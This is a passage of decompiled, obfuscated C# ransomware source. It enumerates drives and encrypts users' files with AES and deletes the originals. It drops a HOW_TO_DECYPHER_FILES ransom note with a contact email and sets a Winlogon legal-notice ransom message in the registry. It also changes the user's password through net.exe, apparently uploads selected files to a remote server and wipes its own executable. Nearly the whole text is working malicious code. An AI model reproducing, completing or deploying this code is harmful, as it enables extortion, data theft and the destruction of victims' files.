				if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_00ba;
			}
			catch
			{
			}
			continue;
			IL_00ba:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains("Builder_Log") && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") && !fileInfo.FullName.EndsWith(".crypted") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(KYDuKlMFWLOzqeDUz))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(HJhinhnlOMNxIX) * 1024.0 * 1024.0 && FFbMRUzulqEpb == "YES")
						{
							list.Add(fileInfo.FullName);
							GXekGISbFWfkZ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && FFbMRUzulqEpb == "NO")
						{
							list.Add(fileInfo.FullName);
							GXekGISbFWfkZ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string tbluQOozLSqDhFc(string BevAcsDSfs = "", string wxrufMgRtpdSU = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = BevAcsDSfs,
				Arguments = wxrufMgRtpdSU,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
		}
		catch
		{
		}
		return result;
	}

	public static void TQpGafavBJI(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string HiawheccNGktKh(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string jKGdMalhZeKXBCvc(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void XQYrYiACEjRdNrb(string gosrANbQZP = "", string JAqyYWMBBauaTk = "SW5mb3JtYXRpb24uLi4=", string aFKNOLefitUrT = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		gosrANbQZP = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=";
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jKGdMalhZeKXBCvc(gosrANbQZP), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue("LegalNoticeCaption", jKGdMalhZeKXBCvc(JAqyYWMBBauaTk));
			registryKey.SetValue("LegalNoticeText", jKGdMalhZeKXBCvc(aFKNOLefitUrT));
			registryKey.Close();
		}
	}

	public static void glLILXcrbW()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (ZPHPKQDuPKi == "YES" && !string.IsNullOrEmpty(rqOtfqTYGrTie) && !string.IsNullOrEmpty(wrCDlMOHoXr))
				{
					XQYrYiACEjRdNrb("", rqOtfqTYGrTie, wrCDlMOHoXr);
				}
				else
				{
					XQYrYiACEjRdNrb();
				}
			}
		}
		catch
		{
		}
	}

	public static void BvfGoSdlqjPP(string OEUeABXDonO = "SW5mb3JtYXRpb24uLi4=", string AbsJbMlYipll = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(jKGdMalhZeKXBCvc(OEUeABXDonO));
		val.set_BalloonTipText(jKGdMalhZeKXBCvc(AbsJbMlYipll));
		val.ShowBalloonTip(30000);
	}

	public static void TQsIfIHUHFwOo(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		tbluQOozLSqDhFc("net.exe", "user " + text + " " + string_0);
	}

	public static bool LEYLEJpRfEgTMCc()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void obllpHNmyTXvR()
	{
		tbluQOozLSqDhFc("cmd.exe", "/C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 “%s” & Del /f /q “%s”");
		string text = "/C choice /C Y /N /D Y /T 3 & Del ";
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static string XfZBgoPdPvsMCS()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string iSQQzPCCLFgv(string string_0)
	{
		string text = Path.GetTempPath() + "\\HOW_TO_DECYPHER_FILES.txt";
		if (!File.Exists(text))
		{
			using StreamWriter streamWriter = new StreamWriter(text);
			streamWriter.WriteLine("Your files were safely cyphered.\r\n\r\nContact: my-contact-email@protonmail.com");
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine("Key Identifier: ");
			streamWriter.WriteLine(string_0);
		}
		else
		{
			File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + string_0);
		}
		return text;
	}

	private static void QvJELJzMCQJDDH(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		ldXpuSFdlzXsf ldXpuSFdlzXsf = new ldXpuSFdlzXsf();
		ldXpuSFdlzXsf.wRpHEPAtkvsJOZo = string_1;
		ldXpuSFdlzXsf.vyUBfhhKAo = string_2;
		ldXpuSFdlzXsf.PrmBaLAeEGy = string_3;
		ldXpuSFdlzXsf.VWJpqjqHbP = string_4;
		ctSkisxFbkPzS = Encoding.ASCII.GetBytes(ldXpuSFdlzXsf.PrmBaLAeEGy);
		if (string_0[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !siKfLgBTOtPOl.Contains(drives[i].Name))
					{
						siKfLgBTOtPOl.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!siKfLgBTOtPOl.Contains(string_0[i]))
				{
					siKfLgBTOtPOl.Add(string_0[i]);
				}
			}
		}
		if (siKfLgBTOtPOl.Contains("C:\\") && XKCeykQXWEYgem == "YES")
		{
			siKfLgBTOtPOl.Remove("C:\\");
		}
		using List<string>.Enumerator enumerator = siKfLgBTOtPOl.GetEnumerator();
		while (enumerator.MoveNext())
		{
			uKOVEKzchnPsIO CS_0024_003C_003E8__locals0 = new uKOVEKzchnPsIO();
			CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj = ldXpuSFdlzXsf;
			CS_0024_003C_003E8__locals0.KxwFjccKfD = enumerator.Current;
			if (FsmxXwwVyXze == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					FAKScXrbtoSt(CS_0024_003C_003E8__locals0.KxwFjccKfD, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.wRpHEPAtkvsJOZo, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.VWJpqjqHbP, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.vyUBfhhKAo, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.PrmBaLAeEGy);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				FAKScXrbtoSt(CS_0024_003C_003E8__locals0.KxwFjccKfD, ldXpuSFdlzXsf.wRpHEPAtkvsJOZo, ldXpuSFdlzXsf.VWJpqjqHbP, ldXpuSFdlzXsf.vyUBfhhKAo, ldXpuSFdlzXsf.PrmBaLAeEGy);
			}
		}
	}

	public static void FAKScXrbtoSt(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (oiSsXsWUMOtEp == "NO")
		{
			list = tsTJYQCcBKUvsb(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = jtxivXeSYrLUbhy.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_033a;
					}
				}
				if ((oCUqHyphdF == "NO" && !item.EndsWith(text)) || CfvwdOobMuXeStMb.Contains(item))
				{
					continue;
				}
				if (zKSeEXflLrlh == "YES")
				{
					try
					{
						if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(item))
						{
							MZxLtJzLRoIRU.RZJqgaZnLiq(item);
						}
					}
					catch
					{
					}
				}
				CfvwdOobMuXeStMb.Add(item);
				if (!CSiGcEXgTf.Contains(Path.GetDirectoryName(item)))
				{
					CSiGcEXgTf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (fCiJsjNmDGYo == "YES" && fileStream.Length > Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024 && !list3.Contains(text))
					{
						if (uySjNlajuEE == "YES")
						{
							foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
							{
								if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
								{
									if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = yZSyNMrNhJ.GoOtXsDsUX(item, Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024);
						byte[] byte_2 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						yZSyNMrNhJ.vGnSKjsiWPsmf(item, byte_2);
						if (string_2 != ".*")
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != ".*")
					{
						QCdYGIiDjEcstt(item, item + string_2, ctSkisxFbkPzS);
					}
					else
					{
						QCdYGIiDjEcstt(item, item + ".part", ctSkisxFbkPzS);
					}
				}
				catch (Exception)
				{
				}
				IL_033a:;
			}
		}
	}

	public static void GXekGISbFWfkZ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		WbDnpXySnYPBD CS_0024_003C_003E8__locals0 = new WbDnpXySnYPBD();
		CS_0024_003C_003E8__locals0.fevfiSigOoErXD = list_0;
		CS_0024_003C_003E8__locals0.RryKduFtzbfiPI = string_1;
		CS_0024_003C_003E8__locals0.DhKhIlMiANCZ = string_2;
		CS_0024_003C_003E8__locals0.KRFQhWmJuhVexr = string_3;
		CS_0024_003C_003E8__locals0.UIEWVHYeVoR = new List<string> { "" };
		Parallel.ForEach(string_0, delegate(string string_0)
		{
			foreach (string item in CS_0024_003C_003E8__locals0.fevfiSigOoErXD)
			{
				if (CS_0024_003C_003E8__locals0.DhKhIlMiANCZ.Length != 0)
				{
					string[] dhKhIlMiANCZ = CS_0024_003C_003E8__locals0.DhKhIlMiANCZ;
					int num = 0;
					while (num < dhKhIlMiANCZ.Length)
					{
						string value = dhKhIlMiANCZ[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f0;
					}
				}
				if ((!(oCUqHyphdF == "NO") || item.EndsWith(string_0)) && !CfvwdOobMuXeStMb.Contains(item))
				{
					if (zKSeEXflLrlh == "YES")
					{
						try
						{
							if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(item))
							{
								MZxLtJzLRoIRU.RZJqgaZnLiq(item);
							}
						}
						catch
						{
						}
					}
					CfvwdOobMuXeStMb.Add(item);
					if (!CSiGcEXgTf.Contains(Path.GetDirectoryName(item)))
					{
						CSiGcEXgTf.Add(Path.GetDirectoryName(item));
					}
					try
					{
						FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (fCiJsjNmDGYo == "YES" && fileStream.Length > Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.UIEWVHYeVoR.Contains(string_0))
						{
							if (uySjNlajuEE == "YES")
							{
								foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
								{
									if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
									{
										if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream.Length)
										{
											try
											{
												MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
											}
											catch
											{
											}
										}
									}
									else if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
									{
										try
										{
											MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
							}
							fileStream.Dispose();
							byte[] byte_ = yZSyNMrNhJ.GoOtXsDsUX(item, Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024);
							byte[] byte_2 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.KRFQhWmJuhVexr), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
							yZSyNMrNhJ.vGnSKjsiWPsmf(item, byte_2);
							if (CS_0024_003C_003E8__locals0.RryKduFtzbfiPI != ".*")
							{
								File.Move(item, item + CS_0024_003C_003E8__locals0.RryKduFtzbfiPI);
							}
						}
						else if (CS_0024_003C_003E8__locals0.RryKduFtzbfiPI != ".*")
						{
							KfLhmyplGPYqxR(item, item + CS_0024_003C_003E8__locals0.RryKduFtzbfiPI, ctSkisxFbkPzS);
						}
						else
						{
							KfLhmyplGPYqxR(item, item + ".part", ctSkisxFbkPzS);
						}
					}
					catch (Exception)
					{
					}
				}
				IL_02f0:;
			}
		});
	}

	private static void QCdYGIiDjEcstt(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (uySjNlajuEE == "YES")
					{
						foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
						{
							if (string_0.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
							{
								if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
							{
								try
								{
									MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void KfLhmyplGPYqxR(string string_0, string string_1, byte[] byte_0)
	{
		IzImQwKqnmdl CS_0024_003C_003E8__locals0 = new IzImQwKqnmdl();
		CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz = string_0;
		CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string ghQNYBCsZpGoSQ = CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ;
			FileStream fileStream = new FileStream(ghQNYBCsZpGoSQ, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ.Length > 0)
				{
					FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (uySjNlajuEE == "YES")
					{
						foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
						{
							if (CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
							{
								if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
							{
								try
								{
									MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.MQXFfvSrdXstlCz);
								break;
							}
							catch
							{
							}
						}
					}).Start();
					if (CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ.EndsWith(".part"))
					{
						File.Move(CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ, CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ.Replace(".part", ""));
					}
					return;
				}
				new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ))
							{
								File.Delete(CS_0024_003C_003E8__locals0.GhQNYBCsZpGoSQ);
							}
							break;
						}
						catch
						{
						}
					}
				}).Start();
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
